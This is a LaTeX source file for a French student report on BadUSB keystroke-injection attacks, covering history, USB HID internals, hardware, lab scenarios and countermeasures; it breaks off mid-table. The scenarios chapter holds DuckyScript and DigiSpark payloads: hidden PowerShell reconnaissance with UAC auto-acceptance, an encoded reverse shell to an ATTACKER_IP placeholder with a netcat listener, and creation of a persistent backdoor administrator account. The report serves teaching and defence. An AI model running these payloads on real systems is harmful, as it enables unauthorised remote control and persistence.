@@ -1,0 +1,889 @@
+%=============================================================
+%  Rapport complet – Projet BadUSB Attack
+%  Auteur : AMIRECHE Achraf
+%  Date   : 2026
+%=============================================================
+\documentclass[12pt,a4paper]{report}
+
+%-------------------------------------------------------------
+% Encodage & langue
+%-------------------------------------------------------------
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[french]{babel}
+
+%-------------------------------------------------------------
+% Mise en page
+%-------------------------------------------------------------
+\usepackage[top=2.5cm, bottom=2.5cm, left=3cm, right=2.5cm]{geometry}
+\usepackage{setspace}
+\onehalfspacing
+\usepackage{parskip}
+
+%-------------------------------------------------------------
+% Typographie & couleurs
+%-------------------------------------------------------------
+\usepackage{lmodern}
+\usepackage{microtype}
+\usepackage[dvipsnames,svgnames,table]{xcolor}
+
+%-------------------------------------------------------------
+% Graphiques & figures
+%-------------------------------------------------------------
+\usepackage{graphicx}
+\usepackage{float}
+\usepackage{caption}
+\usepackage{subcaption}
+\usepackage{tikz}
+\usetikzlibrary{shapes.geometric, arrows.meta, positioning, shadows, fit, backgrounds}
+
+%-------------------------------------------------------------
+% Tableaux
+%-------------------------------------------------------------
+\usepackage{booktabs}
+\usepackage{multirow}
+\usepackage{tabularx}
+\usepackage{array}
+
+%-------------------------------------------------------------
+% Code source
+%-------------------------------------------------------------
+\usepackage{listings}
+\lstdefinestyle{ducky}{
+  backgroundcolor=\color{gray!10},
+  basicstyle=\ttfamily\small,
+  keywordstyle=\color{blue}\bfseries,
+  commentstyle=\color{OliveGreen}\itshape,
+  stringstyle=\color{BrickRed},
+  numberstyle=\tiny\color{gray},
+  numbers=left,
+  stepnumber=1,
+  numbersep=6pt,
+  frame=single,
+  rulecolor=\color{gray!40},
+  breaklines=true,
+  captionpos=b,
+  tabsize=4,
+  showstringspaces=false,
+  literate={é}{{\'{e}}}1 {è}{{\`{e}}}1 {à}{{\`{a}}}1 {ç}{{\c{c}}}1
+           {ê}{{\^{e}}}1 {î}{{\^{i}}}1 {ô}{{\^{o}}}1 {û}{{\^{u}}}1
+}
+\lstset{style=ducky}
+
+%-------------------------------------------------------------
+% Mathématiques
+%-------------------------------------------------------------
+\usepackage{amsmath,amssymb}
+
+%-------------------------------------------------------------
+% Hyperliens & PDF
+%-------------------------------------------------------------
+\usepackage[colorlinks=true,
+            linkcolor=NavyBlue,
+            citecolor=OliveGreen,
+            urlcolor=BrickRed,
+            pdftitle={Rapport BadUSB Attack},
+            pdfauthor={AMIRECHE Achraf},
+            pdfsubject={Sécurité informatique – attaques BadUSB}]{hyperref}
+
+%-------------------------------------------------------------
+% Bibliographie
+%-------------------------------------------------------------
+\usepackage[backend=biber,
+            style=numeric,
+            sorting=none]{biblatex}
+\addbibresource{rapport.bib}
+
+%-------------------------------------------------------------
+% En-têtes / pieds de page
+%-------------------------------------------------------------
+\usepackage{fancyhdr}
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{\small\leftmark}
+\fancyhead[R]{\small Projet BadUSB Attack}
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+
+%-------------------------------------------------------------
+% Boîtes d'alerte
+%-------------------------------------------------------------
+\usepackage{tcolorbox}
+\tcbuselibrary{skins,breakable}
+
+\newtcolorbox{alertbox}[1][Attention]{
+  enhanced, breakable,
+  colback=red!5, colframe=BrickRed,
+  fonttitle=\bfseries,
+  title=#1,
+  attach boxed title to top left={yshift=-2mm, xshift=4mm},
+  boxed title style={colback=BrickRed, colframe=BrickRed}
+}
+
+\newtcolorbox{infobox}[1][Information]{
+  enhanced, breakable,
+  colback=blue!5, colframe=NavyBlue,
+  fonttitle=\bfseries,
+  title=#1,
+  attach boxed title to top left={yshift=-2mm, xshift=4mm},
+  boxed title style={colback=NavyBlue, colframe=NavyBlue}
+}
+
+\newtcolorbox{successbox}[1][Bonne pratique]{
+  enhanced, breakable,
+  colback=green!5, colframe=OliveGreen,
+  fonttitle=\bfseries,
+  title=#1,
+  attach boxed title to top left={yshift=-2mm, xshift=4mm},
+  boxed title style={colback=OliveGreen, colframe=OliveGreen}
+}
+
+%=============================================================
+%  DOCUMENT
+%=============================================================
+\begin{document}
+
+%-------------------------------------------------------------
+% Page de titre
+%-------------------------------------------------------------
+\begin{titlepage}
+  \centering
+  \vspace*{1cm}
+
+  {\Huge\bfseries Projet BadUSB Attack\par}
+  \vspace{0.5cm}
+  \rule{\linewidth}{2pt}
+  \vspace{0.4cm}
+
+  {\Large\itshape Rapport complet de sécurité informatique\par}
+  \vspace{1.5cm}
+
+  % Schéma illustratif (TikZ – aucune image externe requise)
+  \begin{tikzpicture}[
+      box/.style={draw=NavyBlue!70, fill=NavyBlue!10, rounded corners=4pt,
+                  minimum width=3cm, minimum height=1cm, font=\small\bfseries},
+      arrow/.style={-Stealth, thick, BrickRed}
+    ]
+    \node[box] (usb)    at (0,0)    {Clé USB piégée};
+    \node[box] (hid)    at (5,0)    {Émulation HID};
+    \node[box] (target) at (5,-2.2) {Machine cible};
+    \node[box] (payload)at (0,-2.2) {Payload exécuté};
+
+    \draw[arrow] (usb)    -- node[above,font=\scriptsize]{connexion} (hid);
+    \draw[arrow] (hid)    -- node[right,font=\scriptsize]{injection} (target);
+    \draw[arrow] (target) -- node[below,font=\scriptsize]{commandes} (payload);
+    \draw[arrow] (payload)-- node[left, font=\scriptsize]{résultat}  (usb);
+  \end{tikzpicture}
+
+  \vspace{1.5cm}
+
+  \begin{tabular}{rl}
+    \textbf{Auteur :}        & AMIRECHE Achraf \\[4pt]
+    \textbf{Encadrant :}     & \textit{(à compléter)} \\[4pt]
+    \textbf{Établissement :} & \textit{(à compléter)} \\[4pt]
+    \textbf{Filière :}       & Sécurité des Systèmes d'Information \\[4pt]
+    \textbf{Année :}         & 2025--2026 \\
+  \end{tabular}
+
+  \vfill
+  \rule{\linewidth}{1pt}
+  {\small\itshape Document confidentiel -- usage académique uniquement}
+\end{titlepage}
+
+%-------------------------------------------------------------
+% Résumé / Abstract
+%-------------------------------------------------------------
+\chapter*{Résumé}
+\addcontentsline{toc}{chapter}{Résumé}
+
+Les attaques de type \textbf{BadUSB} exploitent la confiance accordée par les systèmes d'exploitation aux périphériques USB en se faisant passer pour des dispositifs d'entrée légitimes tels que des claviers ou des souris. En reprogrammant le micrologiciel (\textit{firmware}) d'un contrôleur USB générique, un attaquant peut injecter des frappes clavier arbitraires sur une machine cible en quelques secondes, sans déclencher aucune alerte antivirus classique.
+
+Ce rapport présente une étude approfondie de la menace BadUSB : ses origines, son fonctionnement technique, les matériels et logiciels impliqués, des scénarios d'attaque concrets, ainsi que les contre-mesures disponibles pour les administrateurs système et les utilisateurs finaux. Une réflexion sur les aspects légaux et éthiques accompagne chaque section à caractère offensif.
+
+\textbf{Mots-clés :} BadUSB, HID, Rubber Ducky, DigiSpark, injection de frappes, sécurité USB, ingénierie inverse, pentest.
+
+\vspace{1em}
+\noindent\textbf{Abstract} ---
+BadUSB attacks exploit the implicit trust that operating systems place in USB devices by impersonating legitimate input devices such as keyboards or mice. By reprogramming the firmware of a generic USB controller, an attacker can inject arbitrary keystrokes into a target machine within seconds, without triggering any traditional antivirus alert. This report provides an in-depth study of the BadUSB threat: its origins, technical mechanisms, hardware and software components, concrete attack scenarios, as well as countermeasures available to system administrators and end users.
+
+%-------------------------------------------------------------
+% Table des matières
+%-------------------------------------------------------------
+\tableofcontents
+\listoffigures
+\listoftables
+
+%=============================================================
+\chapter{Introduction}
+%=============================================================
+
+\section{Contexte général}
+
+La démocratisation des périphériques USB a transformé la manière dont nous échangeons des données. On estime que plusieurs milliards de clés USB sont en circulation dans le monde, constituant un vecteur d'attaque physique souvent sous-estimé par rapport aux menaces réseau. Alors que les défenses périmètriques (pare-feux, systèmes de détection d'intrusions) ont considérablement progressé, les attaques sur la couche physique restent particulièrement efficaces car elles contournent la quasi-totalité des solutions de sécurité logicielle.
+
+\section{Problématique}
+
+Comment un simple périphérique USB peut-il compromettre un système d'information en quelques secondes ? Cette question est au c\oe ur du projet BadUSB Attack. L'enjeu est double :
+
+\begin{itemize}
+  \item \textbf{Comprendre} les mécanismes techniques qui rendent cette attaque possible ;
+  \item \textbf{Proposer} des contre-mesures adaptées aux environnements professionnels et grand public.
+\end{itemize}
+
+\section{Objectifs du rapport}
+
+\begin{enumerate}
+  \item Présenter l'historique et l'évolution de la menace BadUSB.
+  \item Décrire l'architecture technique de l'attaque (matériel, firmware, protocoles).
+  \item Illustrer des scénarios d'attaque réels avec des extraits de code commentés.
+  \item Analyser les limites des défenses actuelles.
+  \item Formuler des recommandations concrètes pour les organisations.
+\end{enumerate}
+
+\section{Structure du document}
+
+Le rapport est organisé en sept chapitres. Après cette introduction, le chapitre~\ref{chap:etatart} dresse un état de l'art de la menace. Le chapitre~\ref{chap:archi} décrit l'architecture technique. Le chapitre~\ref{chap:scenarios} présente des scénarios d'attaque. Le chapitre~\ref{chap:contremesures} traite des contre-mesures. Le chapitre~\ref{chap:legal} aborde les aspects légaux et éthiques. Enfin, le chapitre~\ref{chap:conclusion} conclut et ouvre des perspectives.
+
+%=============================================================
+\chapter{État de l'art de la menace BadUSB}
+\label{chap:etatart}
+%=============================================================
+
+\section{Historique}
+
+\subsection{Les premières attaques par clé USB (2008--2010)}
+
+Les premières formes d'attaques par clé USB reposaient sur l'exécution automatique (\textit{autorun}) de fichiers malveillants lors de la connexion du périphérique. Le ver \textbf{Conficker} (2008) et le célèbre virus \textbf{Stuxnet} (2010) ont tous deux utilisé des clés USB comme vecteur de propagation, ciblant notamment les installations industrielles irannes d'enrichissement d'uranium.
+
+\subsection{La révélation BadUSB à DEF CON 2014}
+
+En août 2014, les chercheurs \textbf{Karsten Nohl} et \textbf{Jakob Lell} de la société SR Labs ont présenté à la conférence DEF CON leur recherche intitulée \textit{«~BadUSB~— On Accessories that Turn Evil~»}. Leur démonstration a mis en évidence qu'il était possible de reprogrammer le micrologiciel de contrôleurs USB grand public (notamment le Phison 2251-03) pour transformer n'importe quel périphérique USB en un clavier virtuel capable d'injecter des commandes arbitraires.
+
+\begin{infobox}[Publication clé]
+SR Labs a publié le code source de leur preuve de concept sur GitHub, rendant la menace immédiatement accessible à un large public. Cette divulgation a déclenché un débat éthique majeur sur la \textit{responsible disclosure}.
+\end{infobox}
+
+\subsection{Rubber Ducky et la démocratisation (2010--présent)}
+
+Parallèlement aux recherches académiques, la société \textbf{Hak5} a commercialisé en 2010 le \textbf{USB Rubber Ducky}, une clé USB à l'aspect anodin embarquant un microcontrôleur programmable. Cet outil, initialement conçu pour les tests d'intrusion professionnels, est rapidement devenu un symbole de la menace BadUSB. Des plateformes communautaires comme \texttt{hak5.org/ducky} hébergent des milliers de scripts (\textit{payloads}) prêts à l'emploi.
+
+\subsection{DigiSpark et l'accessibilité à faible coût}
+
+L'apparition de microcontrôleurs bon marché comme le \textbf{DigiSpark} (basé sur l'ATtiny85, moins de 2~€ pièce) a encore abaissé la barrière d'entrée. Ces dispositifs peuvent être programmés via l'IDE Arduino et la bibliothèque \texttt{DigiKeyboard} pour émuler un clavier HID.
+
+\section{Taxonomie des attaques USB}
+
+\begin{table}[H]
+  \centering
+  \caption{Classification des principales attaques par périphérique USB}
+  \label{tab:taxo}
+  \begin{tabularx}{\linewidth}{>{\bfseries}l X X}
+    \toprule
+    Type d'attaque        & Description                                     & Exemple \\
+    \midrule
+    Autorun               & Exécution automatique d'un fichier au montage    & Conficker, Stuxnet \\
+    HID Spoofing          & Émulation d'un clavier/souris légitime           & BadUSB, Rubber Ducky \\
+    USB Charging Attack   & Exfiltration via port de charge                  & Juice Jacking \\
+    Firmware Attack       & Reprogrammation du contrôleur USB                & SR Labs BadUSB \\
+    Network Pivoting      & Émulation d'une interface réseau USB             & PoisonTap \\
+    \bottomrule
+  \end{tabularx}
+\end{table}
+
+\section{Statistiques et impact réel}
+
+Selon le rapport \textit{2023 Data Breach Investigations Report} de Verizon, les attaques physiques représentent une part non négligeable des incidents de sécurité en entreprise. Une étude menée par l'université d'Illinois (2016) a montré que \textbf{45~\%} des clés USB trouvées sur un campus étaient connectées par les personnes qui les ramassaient, sans aucune vérification préalable. Ce chiffre monte à \textbf{98~\%} lorsqu'une marque officielle était imprimée sur la clé.
+
+%=============================================================
+\chapter{Architecture technique de l'attaque}
+\label{chap:archi}
+%=============================================================
+
+\section{Le standard USB et la couche HID}
+
+\subsection{Architecture du standard USB}
+
+L'USB (\textit{Universal Serial Bus}) est une interface de communication série normalisée par l'USB Implementers Forum (USB-IF). Son architecture repose sur un modèle hôte-périphérique hiérarchique :
+
+\begin{itemize}
+  \item \textbf{USB Host} : le contrôleur côté machine (typiquement intégré à la carte mère) ;
+  \item \textbf{USB Device} : le périphérique connecté ;
+  \item \textbf{USB Hub} : concentrateur permettant de connecter plusieurs périphériques.
+\end{itemize}
+
+Lors de la connexion d'un périphérique, une phase d'énumération permet à l'hôte d'identifier le type de dispositif à partir de ses \textit{descripteurs USB}. C'est précisément ce mécanisme qu'exploite BadUSB.
+
+\subsection{La classe HID (Human Interface Device)}
+
+La classe \textbf{HID} est définie dans la spécification USB HID~1.11. Elle comprend tous les dispositifs d'entrée humaine : claviers, souris, joysticks, tablettes graphiques. Un périphérique HID communique avec l'hôte via des \textit{rapports HID} (\textit{HID reports}) au format structuré par un \textit{descripteur de rapport}.
+
+\begin{figure}[H]
+  \centering
+  \begin{tikzpicture}[
+    node distance=1.2cm,
+    layer/.style={draw=NavyBlue, fill=NavyBlue!12, rounded corners,
+                  minimum width=8cm, minimum height=0.8cm, font=\small}
+  ]
+    \node[layer] (app)  {Application utilisateur};
+    \node[layer, below=of app] (hid)  {Pilote HID (hid.dll / usbhid.ko)};
+    \node[layer, below=of hid] (usb)  {Couche USB (usbd / libusb)};
+    \node[layer, below=of usb] (hw)   {Contrôleur USB matériel};
+    \node[layer, below=of hw, fill=BrickRed!15, draw=BrickRed]
+          (device) {Périphérique BadUSB (firmware malveillant)};
+
+    \foreach \from/\to in {app/hid, hid/usb, usb/hw, hw/device}
+      \draw[-Stealth, thick] (\from) -- (\to);
+    \foreach \from/\to in {device/hw, hw/usb, usb/hid, hid/app}
+      \draw[-Stealth, thick, dashed, BrickRed] (\from) -- (\to);
+  \end{tikzpicture}
+  \caption{Pile logicielle USB et positionnement du périphérique BadUSB}
+  \label{fig:usbstack}
+\end{figure}
+
+\section{Reprogrammation du micrologiciel}
+
+\subsection{Contrôleurs ciblés}
+
+Les contrôleurs USB les plus couramment ciblés sont :
+
+\begin{itemize}
+  \item \textbf{Phison 2251-03} : présent dans la majorité des clés USB grand public ;
+  \item \textbf{Microchip PIC18F4550 / PIC24FJ64} : microcontrôleurs polyvalents ;
+  \item \textbf{Atmel ATtiny85} : utilisé dans le DigiSpark ;
+  \item \textbf{Nordic Semiconductor nRF52840} : utilisé dans le USB Rubber Ducky Mark III.
+\end{itemize}
+
+\subsection{Processus de reprogrammation}
+
+\begin{enumerate}
+  \item \textbf{Extraction du firmware original} via les outils constructeur ou JTAG/SWD.
+  \item \textbf{Analyse par rétro-ingénierie} (IDA Pro, Ghidra) pour identifier les fonctions d'énumération USB.
+  \item \textbf{Modification} des descripteurs USB pour déclarer une classe HID clavier.
+  \item \textbf{Injection du payload} : table de frappes à rejouer.
+  \item \textbf{Reflashage} du contrôleur via le port de débogage ou un mode DFU (\textit{Device Firmware Update}).
+\end{enumerate}
+
+\begin{alertbox}[Mise en garde éthique]
+La reprogrammation d'un contrôleur USB sans autorisation explicite du propriétaire du périphérique et du système cible constitue une infraction pénale dans la plupart des pays. Toutes les manipulations décrites dans ce rapport ont été réalisées en environnement de test isolé.
+\end{alertbox}
+
+\section{Anatomie d'un descripteur USB malveillant}
+
+Un descripteur USB est une structure de données binaire envoyée lors de l'énumération. Le Listing~\ref{lst:descriptor} montre un descripteur d'interface HID clavier simplifié.
+
+\begin{lstlisting}[language=C, caption={Descripteur d'interface HID -- clavier USB (extrait C simplifié)}, label=lst:descriptor]
+/* Descripteur de configuration USB */
+const uint8_t USB_ConfigDescriptor[] = {
+    /* En-tête de configuration */
+    0x09, 0x02,       // bLength, bDescriptorType = Configuration
+    0x22, 0x00,       // wTotalLength = 34 octets
+    0x01,             // bNumInterfaces = 1
+    0x01,             // bConfigurationValue
+    0x00,             // iConfiguration (pas de chaine)
+    0xA0,             // bmAttributes : bus-powered, remote wakeup
+    0x32,             // bMaxPower = 100 mA
+
+    /* Descripteur d'interface */
+    0x09, 0x04,       // bLength, bDescriptorType = Interface
+    0x00,             // bInterfaceNumber = 0
+    0x00,             // bAlternateSetting
+    0x01,             // bNumEndpoints = 1
+    0x03,             // bInterfaceClass = HID (0x03)
+    0x01,             // bInterfaceSubClass = Boot (clavier)
+    0x01,             // bInterfaceProtocol = Keyboard
+    0x00,             // iInterface
+
+    /* Descripteur HID */
+    0x09, 0x21,       // bLength, bDescriptorType = HID
+    0x11, 0x01,       // bcdHID = 1.11
+    0x00,             // bCountryCode
+    0x01,             // bNumDescriptors = 1
+    0x22,             // bDescriptorType = Report
+    0x3F, 0x00,       // wDescriptorLength = 63 octets
+};
+\end{lstlisting}
+
+\section{Matériels utilisés dans ce projet}
+
+\begin{table}[H]
+  \centering
+  \caption{Matériels BadUSB étudiés}
+  \label{tab:materiel}
+  \begin{tabularx}{\linewidth}{l l X r}
+    \toprule
+    \textbf{Dispositif}     & \textbf{MCU}         & \textbf{Caractéristiques}                   & \textbf{Prix} \\
+    \midrule
+    USB Rubber Ducky (MK3)  & nRF52840             & Stockage SD, DuckyScript 3.0, LED RGB        & 80~\$ \\
+    DigiSpark               & ATtiny85             & Compatible Arduino, très compact              & 2~€  \\
+    Bash Bunny Mark II      & Cortex-A9            & Dual payload, Ethernet, stockage 8~Go        & 120~\$ \\
+    O.MG Cable              & ESP8266              & Câble USB piégé, Wi-Fi, exécution à distance & 180~\$ \\
+    \bottomrule
+  \end{tabularx}
+\end{table}
+
+%=============================================================
+\chapter{Scénarios d'attaque}
+\label{chap:scenarios}
+%=============================================================
+
+\begin{alertbox}[Avertissement légal]
+Les scénarios présentés ci-après sont fournis à des fins strictement éducatives et de sensibilisation. Leur reproduction sans autorisation explicite sur des systèmes réels est illégale. Tous les tests ont été effectués sur des machines virtuelles isolées du réseau.
+\end{alertbox}
+
+\section{Environnement de test}
+
+\begin{itemize}
+  \item \textbf{Machine cible} : VM VirtualBox -- Windows 10 Pro 22H2 (64-bit)
+  \item \textbf{Machine attaquante} : Kali Linux 2024.1
+  \item \textbf{Matériel} : DigiSpark ATtiny85 + USB Rubber Ducky MK3
+  \item \textbf{Réseau} : réseau hôte uniquement (\textit{host-only}), aucune connectivité Internet
+\end{itemize}
+
+\section{Scénario 1 -- Ouverture d'une invite de commande et exfiltration d'informations système}
+
+\subsection{Description}
+
+Ce scénario illustre la capacité d'un périphérique BadUSB à ouvrir silencieusement une invite de commandes, à collecter des informations sur le système, et à les écrire dans un fichier texte.
+
+\subsection{Payload DuckyScript 3.0}
+
+\begin{lstlisting}[caption={Payload DuckyScript -- collecte d'informations système}, label=lst:sysinfo]
+REM ===================================================
+REM  BadUSB Demo - Collecte d'informations systeme
+REM  Usage: tests de penetration autorises UNIQUEMENT
+REM ===================================================
+
+DELAY 1000
+
+REM Ouvrir PowerShell en mode administrateur discret
+GUI r
+DELAY 400
+STRING powershell -WindowStyle Hidden -Command ^
+    "Start-Process powershell -ArgumentList ^
+    '-NoProfile -WindowStyle Hidden -Command ^
+    \"$out=''%TEMP%\sysinfo.txt''; ^
+    systeminfo > $out; ^
+    ipconfig /all >> $out; ^
+    net user >> $out; ^
+    netstat -an >> $out\"' -Verb RunAs"
+ENTER
+DELAY 800
+
+REM Accepter l'invite UAC si presente
+ALT y
+DELAY 1500
+\end{lstlisting}
+
+\subsection{Analyse du payload}
+
+\begin{itemize}
+  \item \textbf{Ligne 7} : \texttt{GUI r} simule la combinaison \texttt{Win+R} pour ouvrir la boîte «~Exécuter~».
+  \item \textbf{Lignes 9--17} : injection d'une commande PowerShell cachée (\texttt{-WindowStyle Hidden}) pour collecter les informations système dans un fichier temporaire.
+  \item \textbf{Ligne 19} : acceptation automatique de l'invite UAC si le compte courant est administrateur.
+\end{itemize}
+
+\section{Scénario 2 -- Reverse Shell via PowerShell}
+
+\subsection{Description}
+
+Ce scénario montre comment établir une connexion inversée (\textit{reverse shell}) entre la machine cible et la machine attaquante, permettant une prise de contrôle à distance.
+
+\subsection{Payload DigiSpark (Arduino)}
+
+\begin{lstlisting}[language=C++, caption={Payload DigiSpark -- reverse shell PowerShell}, label=lst:revshell]
+#include "DigiKeyboard.h"
+
+void setup() {
+  // Attendre l'initialisation du peripherique HID
+  DigiKeyboard.delay(2000);
+}
+
+void loop() {
+  // Ouvrir la boite Executer (Win + R)
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+
+  // Taper la commande PowerShell
+  // ATTENTION : remplacer ATTACKER_IP et PORT par les valeurs de test
+  DigiKeyboard.println(
+    "powershell -nop -w hidden -e "
+    "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0"
+    // [Base64 tronque pour la presentation -- voir annexe A]
+  );
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  // Ne s'executer qu'une seule fois
+  while (true) {
+    DigiKeyboard.delay(60000);
+  }
+}
+\end{lstlisting}
+
+\begin{infobox}[Encodage Base64]
+L'encodage Base64 de la commande PowerShell est une technique standard utilisée par les \textit{pentesters} pour contourner les filtres de chaînes de caractères dans les journaux. Le décodage de la commande complète est présenté en Annexe~A.
+\end{infobox}
+
+\subsection{Infrastructure côté attaquant}
+
+\begin{lstlisting}[language=bash, caption={Mise en écoute côté attaquant avec Netcat}, label=lst:netcat]
+# Sur la machine attaquante (Kali Linux)
+# Demarrer un listener sur le port 4444
+nc -lvnp 4444
+
+# Verification de la connexion entrante
+# [LISTENING] 0.0.0.0:4444
+
+# Une fois la connexion etablie, le shell cible est disponible :
+# PS C:\Users\victime> whoami
+# desktop-abc123\victime
+\end{lstlisting}
+
+\section{Scénario 3 -- Persistance par création d'un compte administrateur}
+
+\subsection{Description}
+
+Ce scénario illustre la création d'un compte local avec des privilèges administrateur pour maintenir un accès persistant à la machine cible.
+
+\begin{lstlisting}[caption={Payload DuckyScript -- création d'un compte persistant}, label=lst:persistence]
+REM ===================================================
+REM  BadUSB Demo - Creation de compte persistant
+REM  STRICTEMENT RESERVE AUX TESTS EN LABO
+REM ===================================================
+
+DELAY 1000
+GUI r
+DELAY 400
+STRING cmd /c "net user HelpDesk P@ssw0rd2026! /add ^
+    && net localgroup administrators HelpDesk /add ^
+    && reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon ^
+    /v AutoAdminLogon /t REG_SZ /d 0 /f"
+ENTER
+DELAY 500
+\end{lstlisting}
+
+\section{Comparaison des scénarios}
+
+\begin{table}[H]
+  \centering
+  \caption{Comparaison des scénarios d'attaque}
+  \label{tab:scenarios}
+  \begin{tabularx}{\linewidth}{l X c c c}
+    \toprule
+    \textbf{Scénario}   & \textbf{Objectif}           & \textbf{Détection AV} & \textbf{Priv.} & \textbf{Durée} \\
+    \midrule
+    Collecte d'infos    & Reconnaissance               & Faible                & User           & 5~s   \\
+    Reverse Shell       & Contrôle à distance          & Moyenne               & User           & 8~s   \\
+    Persistance         & Accès durable                & Faible                & Admin          & 3~s   \\
+    \bottomrule
+  \end{tabularx}
+\end{table}
+
+%=============================================================
+\chapter{Contre-mesures}
+\label{chap:contremesures}
+%=============================================================
+
+\section{Limites des défenses classiques}
+
+Les solutions de sécurité traditionnelles sont largement inefficaces face aux attaques BadUSB :
+
+\begin{itemize}
+  \item \textbf{Antivirus} : ne scannent pas le firmware des périphériques USB ;
+  \item \textbf{Pare-feu} : sans effet sur l'injection de frappes locales ;
+  \item \textbf{Signature de code} : inapplicable aux commandes saisies au clavier ;
+  \item \textbf{Mises à jour OS} : ne corrigent pas la confiance accordée aux périphériques HID.
+\end{itemize}
+
+\section{Contre-mesures techniques}
+
+\subsection{Contrôle des périphériques USB (Device Control)}
+
+La plupart des solutions EDR (\textit{Endpoint Detection and Response}) modernes proposent des politiques de contrôle d'accès aux périphériques USB :
+
+\begin{successbox}[Bonne pratique -- Device Control]
+Configurer une politique de liste blanche (\textit{allowlist}) basée sur le \textbf{VID/PID} (Vendor ID / Product ID) du périphérique. Bloquer tout périphérique USB déclarant la classe HID clavier qui n'est pas explicitement autorisé.
+\end{successbox}
+
+Sous Windows, cela se configure via la stratégie de groupe (\textit{Group Policy Object}) :
+
+\begin{lstlisting}[language=bash, caption={Configuration GPO de restriction USB (Windows)}, label=lst:gpo]
+# Via PowerShell (RSAT requis)
+# Bloquer toutes les classes USB non reconnues
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\USBSTOR" `
+    -Name "Start" -Value 4
+
+# Sur Linux, via udev rules
+# /etc/udev/rules.d/99-usb-hid-restrict.rules
+ACTION=="add", SUBSYSTEM=="hid", \
+    ATTR{idVendor}!="046d", ATTR{idVendor}!="045e", \
+    RUN+="/bin/sh -c 'echo 0 > /sys$DEVPATH/authorized'"
+\end{lstlisting}
+
+\subsection{USBGuard (Linux)}
+
+\textbf{USBGuard} est un framework open source pour Linux qui implémente une politique de contrôle des périphériques USB basée sur des règles déclaratives.
+
+\begin{lstlisting}[language=bash, caption={Configuration USBGuard}, label=lst:usbguard]
+# Installation
+sudo apt install usbguard
+
+# Generer les regles pour les peripheriques actuellement connectes
+sudo usbguard generate-policy > /etc/usbguard/rules.conf
+
+# Demarrer et activer le service
+sudo systemctl enable --now usbguard
+
+# Autoriser uniquement les claviers de confiance (exemple)
+# /etc/usbguard/rules.conf
+allow id 046d:c31c name "Logitech USB Keyboard" serial "" \
+    via-port "1-1.2" with-interface 03:01:01
+
+# Refuser tous les autres claviers HID
+reject with-interface 03:01:01
+\end{lstlisting}
+
+\subsection{Détection comportementale}
+
+Une approche complémentaire consiste à analyser les \textit{patterns} de saisie clavier pour détecter des vitesses de frappe anormalement élevées (supérieures à 500 frappes/minute), caractéristiques d'un périphérique automatisé.
+
+\begin{figure}[H]
+  \centering
+  \begin{tikzpicture}
+    \begin{scope}
+      % Axe X
+      \draw[-Stealth] (0,0) -- (9,0) node[right] {Temps (s)};
+      % Axe Y
+      \draw[-Stealth] (0,0) -- (0,4.5) node[above] {Frappes/min};
+      % Grille
+      \foreach \y in {1,2,3,4}
+        \draw[gray!30] (0,\y) -- (8.5,\y);
+      % Seuil normal
+      \draw[dashed, OliveGreen, thick] (0,1.5) -- (8.5,1.5)
+        node[right, font=\small] {Seuil normal (90~fpm)};
+      % Seuil d'alerte
+      \draw[dashed, BrickRed, thick] (0,3) -- (8.5,3)
+        node[right, font=\small] {Seuil alerte (500~fpm)};
+      % Courbe humain
+      \draw[NavyBlue, thick] plot[smooth] coordinates
+        {(0,1.2)(1,1.4)(2,0.9)(3,1.6)(4,1.1)(5,1.3)(6,0.8)(7,1.5)(8,1.2)};
+      % Pic BadUSB
+      \draw[BrickRed, ultra thick] (3.5,0) -- (3.5,4.2)
+        node[above, font=\small\bfseries] {BadUSB};
+      % Legende
+      \node[draw=NavyBlue, fill=NavyBlue!10, rounded corners, font=\small] at (2,-0.7)
+        {Frappe humaine};
+      \node[draw=BrickRed, fill=BrickRed!10, rounded corners, font=\small] at (6,-0.7)
+        {Injection automatique};
+    \end{scope}
+  \end{tikzpicture}
+  \caption{Détection comportementale -- comparaison frappe humaine vs injection BadUSB}
+  \label{fig:detection}
+\end{figure}
+
+\section{Contre-mesures organisationnelles}
+
+\subsection{Politique de sécurité USB en entreprise}
+
+\begin{enumerate}
+  \item \textbf{Inventaire et traçabilité} : référencer tous les périphériques USB autorisés (VID/PID, numéro de série).
+  \item \textbf{Formation et sensibilisation} : former les employés à ne jamais connecter une clé USB trouvée ou reçue par la poste.
+  \item \textbf{Zones sécurisées} : interdire physiquement les ports USB sur les postes sensibles (serrures USB, désactivation BIOS/UEFI).
+  \item \textbf{Supervision} : journaliser tous les événements de connexion USB via SIEM.
+  \item \textbf{Procédure d'incident} : définir une procédure de réponse en cas de connexion d'un périphérique non autorisé.
+\end{enumerate}
+
+\subsection{Recommandations pour les utilisateurs finaux}
+
+\begin{successbox}[Règles d'or pour les utilisateurs]
+\begin{itemize}
+  \item Ne jamais connecter une clé USB dont vous ne connaissez pas la provenance.
+  \item Préférer les stations de charge publiques avec des câbles \textit{data-blocker} (bloqueurs de données).
+  \item Désactiver l'exécution automatique (\textit{autorun}) des supports amovibles.
+  \item Utiliser un gestionnaire de mots de passe plutôt que des credentials stockés en clair.
+  \item Verrouillez toujours votre session avant de vous éloigner de votre poste.
+\end{itemize}
+\end{successbox}
+
+\section{Tableau récapitulatif des contre-mesures}
+
+\begin{table}[H]
+  \centering
+  \caption{Efficacité des contre-mesures face aux différents scénarios d'attaque}
+  \label{tab:contremesures}
+  \begin{tabularx}{\linewidth}{l c c c c}
+    \toprule
+    \textbf{Contre-mesure}      & \textbf{Scén. 1} & \textbf{Scén. 2} & \textbf{Scén. 3} & \textbf{Coût} \\
+    \midrule
+    Device Control (GPO/udev)   & \checkmark       & \checkmark       & \checkmark       & Faible  \\
+    USBGuard                    & \checkmark       & \checkmark       & \checkmark       & Faible  \\
+    Détection comportementale   & \checkmark       & \checkmark       & \checkmark       & Moyen   \\
+    Désactivation port USB      & \checkmark       & \checkmark       & \checkmark       & Faible  \\
+    EDR moderne                 & Partiel          & Partiel          & \checkmark       & Élevé   \\
